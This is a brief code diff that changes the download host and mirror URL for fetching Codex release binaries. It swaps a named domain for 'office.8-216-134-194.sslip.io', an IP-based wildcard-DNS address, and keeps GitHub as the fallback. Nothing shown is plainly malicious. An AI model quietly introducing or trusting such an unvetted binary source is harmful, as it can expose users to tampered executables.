@@ -28,10 +28,10 @@ const DEFAULT_DOWNLOAD_TIMEOUT_MS = 10 * 60_000
 const DEFAULT_PROBE_TIMEOUT_MS = 5_000
 const DEFAULT_LOCK_TIMEOUT_MS = 30_000
 const CAPACITY_MARGIN_BYTES = 64 * 1024 * 1024
-const PRIMARY_DOWNLOAD_HOST = 'downloads.wiswork.com'
+const PRIMARY_DOWNLOAD_HOST = 'office.8-216-134-194.sslip.io'
 const FALLBACK_DOWNLOAD_HOST = 'github.com'
 const MANIFEST_SOURCE_PREFIX = 'https://github.com/openai/codex/releases/download/rust-v0.147.0/'
-const MANIFEST_MIRROR_PREFIX = 'https://downloads.wiswork.com/components/codex/0.147.0/'
+const MANIFEST_MIRROR_PREFIX = 'https://office.8-216-134-194.sslip.io/components/codex/0.147.0/'
 const LICENSE_SOURCE = 'https://github.com/openai/codex/blob/rust-v0.147.0/LICENSE'
 const execFile = promisify(nodeExecFile)
 
